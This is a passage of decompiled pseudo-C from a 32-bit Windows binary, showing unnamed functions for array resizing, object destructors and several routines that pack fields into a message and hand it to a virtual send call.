      (*(void (__stdcall **)(int))(*(_DWORD *)(this[3] + v5) + 56))(this[3] + v5 + 16);
      ++v4;
      v5 += 16;
    }
    while ( v4 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(int, void *))(*(_DWORD *)(16 * v6 + this[3]) + 56))(16 * v6 + this[3], &unk_10193BB8);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1004EB40) --------------------------------------------------------
int __thiscall sub_1004EB40(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101305DB);
  return this[3] + 16 * a2;
}

//----- (1004EB5F) --------------------------------------------------------
int __thiscall sub_1004EB5F(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101305DF);
  return this[3] + 16 * a2;
}

//----- (1004EB7E) --------------------------------------------------------
void __thiscall sub_1004EB7E(_DWORD *this, unsigned int a2)
{
  void (__thiscall ***v2)(_DWORD, int); // esi

  if ( this[2] < a2 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void (__thiscall ***)(_DWORD, int), unsigned int))(*this + 84))(
      this,
      this[1],
      v2,
      a2);
    if ( v2 )
    {
      if ( *(v2 - 1) )
        (**v2)(v2, 3);
      else
        j__free(v2 - 1);
    }
  }
}

//----- (1004EBB6) --------------------------------------------------------
int __thiscall sub_1004EBB6(_DWORD *this, unsigned int a2)
{
  unsigned int v3; // ebp
  int v4; // edi
  int v5; // eax

  v3 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 16 * a2;
    do
    {
      (*(void (__thiscall **)(int, void *))(*(_DWORD *)(this[3] + v4) + 56))(this[3] + v4, &unk_10193BB8);
      ++v3;
      v4 += 16;
    }
    while ( v3 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v5 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}

//----- (1004EC08) --------------------------------------------------------
unsigned int __thiscall sub_1004EC08(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101306C5);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 16;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (1004EC84) --------------------------------------------------------
unsigned int __thiscall sub_1004EC84(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax
  int v12; // edi

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 28 != 0 ? -1 : 16 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0x10u,
      v5,
      (void (__thiscall *)(void *))sub_1000A11B,
      (void (__thiscall *)(void *))sub_100099A2);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    v12 = 0;
    do
    {
      (*(void (__thiscall **)(int, int))(*(_DWORD *)(this[3] + v12) + 56))(this[3] + v12, v12 + a3);
      ++v10;
      v12 += 16;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (1004ED2B) --------------------------------------------------------
void __thiscall sub_1004ED2B(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  char *v6; // ebx
  int v7; // ecx
  int *v8; // eax
  char *v9; // edi
  char *v10; // edi
  char *i; // eax
  unsigned int v12; // [esp+14h] [ebp-18h]
  int v13; // [esp+18h] [ebp-14h]
  char *v14; // [esp+1Ch] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v13 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (char *)this[3];
    v7 = (unsigned __int64)(unsigned int)v13 >> 28 != 0 ? -1 : 16 * v13;
    v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
    if ( v8 )
    {
      v9 = (char *)(v8 + 1);
      *v8 = v13;
      `eh vector constructor iterator'(
        v8 + 1,
        0x10u,
        v13,
        (void (__thiscall *)(void *))sub_1000A11B,
        (void (__thiscall *)(void *))sub_100099A2);
      v14 = v9;
    }
    else
    {
      v14 = 0;
    }
    v12 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v10 = v14;
      for ( i = (char *)(v6 - v14); ; i = (char *)(v6 - v14) )
      {
        (*(void (__thiscall **)(char *, char *))(*(_DWORD *)v10 + 56))(v10, &i[(_DWORD)v10]);
        ++v12;
        v10 += 16;
        if ( v12 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
    }
    this[3] = v14;
    if ( v6 )
    {
      if ( *((_DWORD *)v6 - 1) )
        (**(void (__thiscall ***)(char *, int))v6)(v6, 3);
      else
        j__free(v6 - 4);
    }
    this[2] = v13;
  }
}

//----- (1004EE42) --------------------------------------------------------
void __thiscall sub_1004EE42(_DWORD *this)
{
  *this = &off_10104340;
  sub_1004E9A4(this + 5);
  sub_100068A5(this + 1);
  sub_10039F05(this);
}
// 10104340: using guessed type int (__thiscall *off_10104340)(void *Block, char);

//----- (1004EE85) --------------------------------------------------------
int __thiscall sub_1004EE85(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  int v5; // eax
  _DWORD v7[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v8; // [esp+28h] [ebp-4h]

  v3 = sub_1001901E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), sub_1000D65C(a2, v4)) )
  {
    (*(void (__thiscall **)(_DWORD *, int, int))(this[1] + 32))(this + 1, a2, v3);
    sub_1000A11B(v7);
    v8 = 0;
    (*(void (__thiscall **)(_DWORD *, int, int))(this[5] + 32))(this + 5, v5, v3);
    v8 = -1;
    sub_100099A2(v7);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 1004EEDE: variable 'v5' is possibly undefined
// 1004EE85: using guessed type _DWORD var_1C[6];

//----- (1004EEFE) --------------------------------------------------------
void __thiscall sub_1004EEFE(void *this, int a2, void *a3)
{
  int v4; // eax
  _DWORD v5[5]; // [esp+Ch] [ebp-20h] BYREF
  int v6; // [esp+28h] [ebp-4h]

  sub_1004F184(a3, v5);
  v6 = 0;
  v4 = (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v4 + 56))(v4, v5);
  v6 = -1;
  sub_100099A2(v5);
}
// 1004EEFE: using guessed type _DWORD var_20[5];

//----- (1004EF73) --------------------------------------------------------
_DWORD *__thiscall sub_1004EF73(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-28h]
  int v6; // [esp-4h] [ebp-24h]

  v2 = this + 5;
  *a2 = off_100FBF5C;
  *a2 = &off_10104380;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[5] + 4))(this + 5);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_1004EC84(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104380: using guessed type int (__thiscall *off_10104380)(void *Block, char);

//----- (1004EFCD) --------------------------------------------------------
void __thiscall sub_1004EFCD(_DWORD *this)
{
  *this = &off_101043DC;
  sub_100068A5(this + 5);
  sub_100079EC((int)(this + 1));
  sub_10039F05(this);
}
// 101043DC: using guessed type int (__thiscall *off_101043DC)(void *Block, char);

//----- (1004F010) --------------------------------------------------------
char __thiscall sub_1004F010(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1003F0D1(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (1004F05D) --------------------------------------------------------
int __thiscall sub_1004F05D(_DWORD *this, _DWORD *a2)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v3 = sub_1003F0D1(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, a2, v3);
    v4 = sub_1000D17D(v6, &word_10130820);
    v7 = 0;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[5] + 32))(this + 5, v4, v3);
    v7 = -1;
    sub_1000D3AD(v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}

//----- (1004F0D3) --------------------------------------------------------
int __thiscall sub_1004F0D3(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // esi
  int v4; // edi
  _DWORD *v6; // eax

  v3 = a2;
  v4 = sub_1003F0D1(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) != *v3 )
  {
    v6 = sub_1000E8EF(&a2);
    sub_100078FE((int)v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (1004F130) --------------------------------------------------------
_DWORD *__thiscall sub_1004F130(_DWORD *Block, char a2)
{
  sub_1004E9A4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004F14C) --------------------------------------------------------
_DWORD *__thiscall sub_1004F14C(_DWORD *Block, char a2)
{
  sub_1004EE42(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004F168) --------------------------------------------------------
_DWORD *__thiscall sub_1004F168(_DWORD *Block, char a2)
{
  sub_1004EFCD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004F184) --------------------------------------------------------
_DWORD *__thiscall sub_1004F184(void *this, _DWORD *a2)
{
  *a2 = off_100FBF5C;
  *a2 = &off_100FC268;
  a2[1] = 0;
  a2[2] = 0;
  a2[3] = 0;
  sub_10009DE4((int)this, (int)a2);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 100FC268: using guessed type int (__thiscall *off_100FC268)(void *, char);

//----- (1004F1C4) --------------------------------------------------------
_DWORD *__stdcall sub_1004F1C4(_DWORD *a1)
{
  unsigned int v1; // esi
  _DWORD *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // eax

  *a1 = off_100FBF5C;
  v1 = 1;
  *a1 = &off_10104380;
  do
    v1 *= 2;
  while ( v1 < 0x10 );
  v2 = 0;
  a1[1] = 0;
  a1[2] = v1;
  v3 = (unsigned __int64)v1 >> 28 != 0 ? -1 : 16 * v1;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = v1;
    `eh vector constructor iterator'(
      v4 + 1,
      0x10u,
      v1,
      (void (__thiscall *)(void *))sub_1000A11B,
      (void (__thiscall *)(void *))sub_100099A2);
  }
  a1[3] = v2;
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104380: using guessed type int (__thiscall *off_10104380)(void *Block, char);

//----- (1004F24F) --------------------------------------------------------
HANDLE *__thiscall sub_1004F24F(HANDLE *Block, char a2)
{
  sub_1004F26B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004F26B) --------------------------------------------------------
void __thiscall sub_1004F26B(HANDLE *this)
{
  *this = off_1010445C;
  sub_1001F16A(this + 2);
}
// 1010445C: using guessed type int (__thiscall *off_1010445C[2])(void *Block, char);

//----- (1004F292) --------------------------------------------------------
void __thiscall sub_1004F292(_DWORD *this, char a2, int a3, int a4, int a5)
{
  char v6; // al
  int v7; // ecx
  int v8; // eax
  int v9; // [esp-8h] [ebp-228h] BYREF
  int v10; // [esp-4h] [ebp-224h]
  char v11[112]; // [esp+10h] [ebp-210h] BYREF
  int v12[5]; // [esp+80h] [ebp-1A0h] BYREF
  _DWORD v13[9]; // [esp+94h] [ebp-18Ch] BYREF
  _DWORD v14[9]; // [esp+B8h] [ebp-168h] BYREF
  _DWORD *v15[2]; // [esp+DCh] [ebp-144h] BYREF
  int v16; // [esp+E4h] [ebp-13Ch]
  _DWORD v17[77]; // [esp+E8h] [ebp-138h] BYREF
  int v18; // [esp+21Ch] [ebp-4h]

  v16 = a3;
  v18 = 0;
  if ( a4 || (sub_1000A219(&a4, dword_1017DB58), a4) )
  {
    LOBYTE(v18) = 1;
    sub_1001AC1E((int)v13);
    LOBYTE(v18) = 2;
    sub_100528AC(v17);
    LOBYTE(v18) = 3;
    sub_10052AB7(v13, (int)v11, (int)v17);
    LOBYTE(v18) = 4;
    sub_1001A969(v11, v14, 0);
    LOBYTE(v18) = 5;
    sub_1000ED72((int)(this + 2), v15);
    LOBYTE(v18) = 6;
    sub_1001AA80(v14, this[1]++);
    LOBYTE(v18) = 5;
    sub_1000EDA4(v15);
    v6 = sub_1001C764();
    sub_1001AA80(v14, v6);
    sub_1001AA80(v14, a2);
    sub_1001AA35(v14, 0);
    v10 = v7;
    v9 = v7;
    v15[1] = &v9;
    sub_1000D372(&v9, v16);
    LOBYTE(v18) = 5;
    sub_1001AAB4(v14, v9, v10);
    v8 = sub_1001AD84(v13, (int)v12);
    LOBYTE(v18) = 8;
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)a4 + 4))(a4, v8, 106);
    LOBYTE(v18) = 5;
    sub_1000B3DF(v12);
    LOBYTE(v18) = 4;
    sub_1001A9CE((int)v14);
    LOBYTE(v18) = 3;
    sub_10052BF8((int)v11);
    LOBYTE(v18) = 2;
    sub_1004F436(v17);
    LOBYTE(v18) = 1;
    sub_1001AC89((int)v13);
    v18 = 0;
  }
  v18 = -1;
  sub_1000780D(&a4);
  sub_1009FFCE();
}
// 1004F37E: variable 'v7' is possibly undefined
// 1017DB58: using guessed type _DWORD dword_1017DB58[2];
// 1004F292: using guessed type _DWORD var_18C[9];
// 1004F292: using guessed type _DWORD var_138[77];
// 1004F292: using guessed type _DWORD var_168[9];
// 1004F292: using guessed type int var_1A0[5];

//----- (1004F436) --------------------------------------------------------
void __stdcall sub_1004F436(_DWORD *a1)
{
  sub_1000B3DF(a1 + 66);
  *a1 = &off_101045A8;
}
// 101045A8: using guessed type int (__thiscall *off_101045A8)(void *Block, char);

//----- (1004F466) --------------------------------------------------------
void __thiscall sub_1004F466(_DWORD *this, char a2, int a3, char a4, int a5, int a6)
{
  char v7; // al
  int v8; // ecx
  int v9; // eax
  int v10; // [esp-8h] [ebp-22Ch] BYREF
  int v11; // [esp-4h] [ebp-228h]
  char v12[112]; // [esp+10h] [ebp-214h] BYREF
  int v13[5]; // [esp+80h] [ebp-1A4h] BYREF
  _DWORD v14[9]; // [esp+94h] [ebp-190h] BYREF
  _DWORD v15[9]; // [esp+B8h] [ebp-16Ch] BYREF
  _DWORD *v16[2]; // [esp+DCh] [ebp-148h] BYREF
  int v17; // [esp+E4h] [ebp-140h]
  _DWORD v18[78]; // [esp+E8h] [ebp-13Ch] BYREF
  int v19; // [esp+220h] [ebp-4h]

  v17 = a3;
  v19 = 0;
  if ( a5 || (sub_1000A219(&a5, dword_1017DB58), a5) )
  {
    LOBYTE(v19) = 1;
    sub_1001AC1E((int)v14);
    LOBYTE(v19) = 2;
    sub_100528AC(v18);
    LOBYTE(v19) = 3;
    sub_10052AB7(v14, (int)v12, (int)v18);
    LOBYTE(v19) = 4;
    sub_1001A969(v12, v15, 0);
    LOBYTE(v19) = 5;
    sub_1000ED72((int)(this + 2), v16);
    LOBYTE(v19) = 6;
    sub_1001AA80(v15, this[1]++);
    LOBYTE(v19) = 5;
    sub_1000EDA4(v16);
    v7 = sub_1001C764();
    sub_1001AA80(v15, v7);
    sub_1001AA80(v15, a2);
    sub_1001AA35(v15, 1);
    v11 = v8;
    v10 = v8;
    v16[1] = &v10;
    sub_1000D372(&v10, v17);
    LOBYTE(v19) = 5;
    sub_1001AAB4(v15, v10, v11);
    sub_1001AA80(v15, a4);
    v9 = sub_1001AD84(v14, (int)v13);
    LOBYTE(v19) = 8;
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)a5 + 4))(a5, v9, 106);
    LOBYTE(v19) = 5;
    sub_1000B3DF(v13);
    LOBYTE(v19) = 4;
    sub_1001A9CE((int)v15);
    LOBYTE(v19) = 3;
    sub_10052BF8((int)v12);
    LOBYTE(v19) = 2;
    sub_1004F436(v18);
    LOBYTE(v19) = 1;
    sub_1001AC89((int)v14);
    v19 = 0;
  }
  v19 = -1;
  sub_1000780D(&a5);
  sub_1009FFCE();
}
// 1004F552: variable 'v8' is possibly undefined
// 1017DB58: using guessed type _DWORD dword_1017DB58[2];
// 1004F466: using guessed type _DWORD var_190[9];
// 1004F466: using guessed type _DWORD var_13C[78];
// 1004F466: using guessed type _DWORD var_16C[9];
// 1004F466: using guessed type int var_1A4[5];

//----- (1004F618) --------------------------------------------------------
void __thiscall sub_1004F618(_DWORD *this, char a2, int a3, char a4, char a5, int a6, int a7)
{
  char v8; // al
  int v9; // ecx
  int v10; // eax
  int v11; // [esp-8h] [ebp-FCh] BYREF
  int v12; // [esp-4h] [ebp-F8h]
  char v13[108]; // [esp+10h] [ebp-E4h] BYREF
  int v14[5]; // [esp+7Ch] [ebp-78h] BYREF
  _DWORD v15[9]; // [esp+90h] [ebp-64h] BYREF
  _DWORD v16[9]; // [esp+B4h] [ebp-40h] BYREF
  _DWORD *v17[2]; // [esp+D8h] [ebp-1Ch] BYREF
  int v18; // [esp+E0h] [ebp-14h]
  int v19; // [esp+F0h] [ebp-4h]
  _DWORD v20[71]; // [esp+F4h] [ebp+0h] BYREF

  v18 = a3;
  v19 = 0;
  if ( a6 || (sub_1000A219(&a6, dword_1017DB58), a6) )
  {
    LOBYTE(v19) = 1;
    sub_1001AC1E((int)v15);
    LOBYTE(v19) = 2;
    sub_100528AC(v20);
    LOBYTE(v19) = 3;
    sub_10052AB7(v15, (int)v13, (int)v20);
    LOBYTE(v19) = 4;
    sub_1001A969(v13, v16, 0);
    LOBYTE(v19) = 5;
    sub_1000ED72((int)(this + 2), v17);
    LOBYTE(v19) = 6;
    sub_1001AA80(v16, this[1]++);
    LOBYTE(v19) = 5;
    sub_1000EDA4(v17);
    v8 = sub_1001C764();
    sub_1001AA80(v16, v8);
    sub_1001AA80(v16, a2);
    sub_1001AA35(v16, 7);
    v12 = v9;
    v11 = v9;
    v17[1] = &v11;
    sub_1000D372(&v11, v18);
    LOBYTE(v19) = 5;
    sub_1001AAB4(v16, v11, v12);
    sub_1001AA80(v16, a4);
    sub_1001AA80(v16, a5);
    v10 = sub_1001AD84(v15, (int)v14);
    LOBYTE(v19) = 8;
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)a6 + 4))(a6, v10, 106);
    LOBYTE(v19) = 5;
    sub_1000B3DF(v14);
    LOBYTE(v19) = 4;
    sub_1001A9CE((int)v16);
    LOBYTE(v19) = 3;
    sub_10052BF8((int)v13);
    LOBYTE(v19) = 2;
    sub_1004F436(v20);
    LOBYTE(v19) = 1;
    sub_1001AC89((int)v15);
    v19 = 0;
  }
  v19 = -1;
  sub_1000780D(&a6);
}
// 1004F70A: variable 'v9' is possibly undefined
// 1017DB58: using guessed type _DWORD dword_1017DB58[2];
// 1004F618: using guessed type _DWORD var_184[9];
// 1004F618: using guessed type _DWORD var_120[71];
// 1004F618: using guessed type _DWORD var_160[9];
// 1004F618: using guessed type int var_198[5];

//----- (1004F7E6) --------------------------------------------------------
void __thiscall sub_1004F7E6(_DWORD *this, char a2, char a3, int a4, int a5)
{
  char v6; // al
  int v7; // eax
  char v8[116]; // [esp+10h] [ebp-210h] BYREF
  int v9[5]; // [esp+84h] [ebp-19Ch] BYREF
  _DWORD v10[9]; // [esp+98h] [ebp-188h] BYREF
  _DWORD v11[9]; // [esp+BCh] [ebp-164h] BYREF
  _DWORD *v12[2]; // [esp+E0h] [ebp-140h] BYREF
  _DWORD v13[77]; // [esp+E8h] [ebp-138h] BYREF
  int v14; // [esp+21Ch] [ebp-4h]

  v14 = 0;
  if ( a4 || (sub_1000A219(&a4, dword_1017DB58), a4) )
  {
    LOBYTE(v14) = 1;
    sub_1001AC1E((int)v10);
    LOBYTE(v14) = 2;
    sub_100528AC(v13);
    LOBYTE(v14) = 3;
    sub_10052AB7(v10, (int)v8, (int)v13);
    LOBYTE(v14) = 4;
    sub_1001A969(v8, v11, 0);
    LOBYTE(v14) = 5;
    sub_1000ED72((int)(this + 2), v12);
    LOBYTE(v14) = 6;
    sub_1001AA80(v11, this[1]++);
    LOBYTE(v14) = 5;
    sub_1000EDA4(v12);
    v6 = sub_1001C764();
    sub_1001AA80(v11, v6);
    sub_1001AA80(v11, a2);
    sub_1001AA35(v11, 2);
    sub_1001AA80(v11, a3);
    v7 = sub_1001AD84(v10, (int)v9);
    LOBYTE(v14) = 7;
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)a4 + 4))(a4, v7, 106);
    LOBYTE(v14) = 5;
    sub_1000B3DF(v9);
    LOBYTE(v14) = 4;
    sub_1001A9CE((int)v11);
    LOBYTE(v14) = 3;
    sub_10052BF8((int)v8);
    LOBYTE(v14) = 2;
    sub_1004F436(v13);
    LOBYTE(v14) = 1;
    sub_1001AC89((int)v10);
    v14 = 0;
  }
  v14 = -1;
  sub_1000780D(&a4);
  sub_1009FFCE();
}
// 1017DB58: using guessed type _DWORD dword_1017DB58[2];
// 1004F7E6: using guessed type _DWORD var_188[9];
// 1004F7E6: using guessed type _DWORD var_138[77];
// 1004F7E6: using guessed type _DWORD var_164[9];
// 1004F7E6: using guessed type int var_19C[5];

//----- (1004F966) --------------------------------------------------------
void __thiscall sub_1004F966(_DWORD *this, char a2, char a3, char a4, int a5, int a6)
{
  char v7; // al
  int v8; // eax
  char v9[116]; // [esp+10h] [ebp-214h] BYREF
  int v10[5]; // [esp+84h] [ebp-1A0h] BYREF
  _DWORD v11[9]; // [esp+98h] [ebp-18Ch] BYREF
  _DWORD v12[9]; // [esp+BCh] [ebp-168h] BYREF
  _DWORD *v13[2]; // [esp+E0h] [ebp-144h] BYREF
  _DWORD v14[78]; // [esp+E8h] [ebp-13Ch] BYREF
  int v15; // [esp+220h] [ebp-4h]

  v15 = 0;
  if ( a5 || (sub_1000A219(&a5, dword_1017DB58), a5) )
  {
    LOBYTE(v15) = 1;
    sub_1001AC1E((int)v11);
    LOBYTE(v15) = 2;
    sub_100528AC(v14);
    LOBYTE(v15) = 3;
    sub_10052AB7(v11, (int)v9, (int)v14);
    LOBYTE(v15) = 4;
    sub_1001A969(v9, v12, 0);
    LOBYTE(v15) = 5;
    sub_1000ED72((int)(this + 2), v13);
    LOBYTE(v15) = 6;
    sub_1001AA80(v12, this[1]++);
    LOBYTE(v15) = 5;
    sub_1000EDA4(v13);
    v7 = sub_1001C764();
    sub_1001AA80(v12, v7);
    sub_1001AA80(v12, a2);
    sub_1001AA35(v12, 3);
    sub_1001AA80(v12, a3);
    sub_1001AA80(v12, a4);
    v8 = sub_1001AD84(v11, (int)v10);
    LOBYTE(v15) = 7;
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)a5 + 4))(a5, v8, 106);
    LOBYTE(v15) = 5;
    sub_1000B3DF(v10);
    LOBYTE(v15) = 4;
    sub_1001A9CE((int)v12);
    LOBYTE(v15) = 3;
    sub_10052BF8((int)v9);
    LOBYTE(v15) = 2;
    sub_1004F436(v14);
    LOBYTE(v15) = 1;
    sub_1001AC89((int)v11);
    v15 = 0;
  }
  v15 = -1;
  sub_1000780D(&a5);
  sub_1009FFCE();
}
// 1017DB58: using guessed type _DWORD dword_1017DB58[2];
// 1004F966: using guessed type _DWORD var_18C[9];
// 1004F966: using guessed type _DWORD var_13C[78];
// 1004F966: using guessed type _DWORD var_168[9];
// 1004F966: using guessed type int var_1A0[5];

//----- (1004FAF4) --------------------------------------------------------
void __thiscall sub_1004FAF4(_DWORD *this, char a2, int a3, int a4, char a5, int a6, int a7)
{
  char v8; // al
  int v9; // ecx
  int v10; // ecx
  int v11; // eax
  int v12; // [esp-8h] [ebp-230h] BYREF
  int v13; // [esp-4h] [ebp-22Ch]
  char v14[116]; // [esp+10h] [ebp-218h] BYREF
  int v15[5]; // [esp+84h] [ebp-1A4h] BYREF
  _DWORD v16[9]; // [esp+98h] [ebp-190h] BYREF
  _DWORD v17[9]; // [esp+BCh] [ebp-16Ch] BYREF
  int v18; // [esp+E0h] [ebp-148h]
  int v19; // [esp+E4h] [ebp-144h]
  _DWORD *v20; // [esp+E8h] [ebp-140h] BYREF
  void *v21; // [esp+ECh] [ebp-13Ch]
  _DWORD v22[77]; // [esp+F0h] [ebp-138h] BYREF
  int v23; // [esp+224h] [ebp-4h]

  v19 = a3;
  v18 = a4;
  v23 = 0;
  if ( a6 || (sub_1000A219(&a6, dword_1017DB58), a6) )
  {
    LOBYTE(v23) = 1;
    sub_1001AC1E((int)v16);
    LOBYTE(v23) = 2;
    sub_100528AC(v22);
    LOBYTE(v23) = 3;
    sub_10052AB7(v16, (int)v14, (int)v22);
    LOBYTE(v23) = 4;
    sub_1001A969(v14, v17, 0);
    LOBYTE(v23) = 5;
    sub_1000ED72((int)(this + 2), &v20);
    LOBYTE(v23) = 6;
    sub_1001AA80(v17, this[1]++);
    LOBYTE(v23) = 5;
    sub_1000EDA4(&v20);
    v8 = sub_1001C764();
    sub_1001AA80(v17, v8);
    sub_1001AA80(v17, a2);
    sub_1001AA35(v17, 5);
    v13 = v9;
    v12 = v9;
    v21 = &v12;
    sub_1000D372(&v12, v19);
    LOBYTE(v23) = 5;
    sub_1001AAB4(v17, v12, v13);
    v13 = v10;
    v12 = v10;
    v21 = &v12;
    sub_1000D372(&v12, v18);
    LOBYTE(v23) = 5;
    sub_1001AAB4(v17, v12, v13);
    sub_1001AA80(v17, a5);
    v11 = sub_1001AD84(v16, (int)v15);
    LOBYTE(v23) = 9;
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)a6 + 4))(a6, v11, 106);
    LOBYTE(v23) = 5;
    sub_1000B3DF(v15);
    LOBYTE(v23) = 4;
    sub_1001A9CE((int)v17);
    LOBYTE(v23) = 3;
    sub_10052BF8((int)v14);
    LOBYTE(v23) = 2;
    sub_1004F436(v22);
    LOBYTE(v23) = 1;
    sub_1001AC89((int)v16);
    v23 = 0;
  }
  v23 = -1;
  sub_1000780D(&a6);
  sub_1009FFCE();
}
// 1004FBE9: variable 'v9' is possibly undefined
// 1004FC12: variable 'v10' is possibly undefined
// 1017DB58: using guessed type _DWORD dword_1017DB58[2];
// 1004FAF4: using guessed type _DWORD var_190[9];
// 1004FAF4: using guessed type _DWORD var_138[77];
// 1004FAF4: using guessed type _DWORD var_16C[9];
// 1004FAF4: using guessed type int var_1A4[5];

//----- (1004FCD8) --------------------------------------------------------
void __thiscall sub_1004FCD8(_DWORD *this, char a2, int a3, int a4, int a5, int a6)
{
  char v7; // al
  int v8; // ecx
  int v9; // ecx
  int v10; // eax
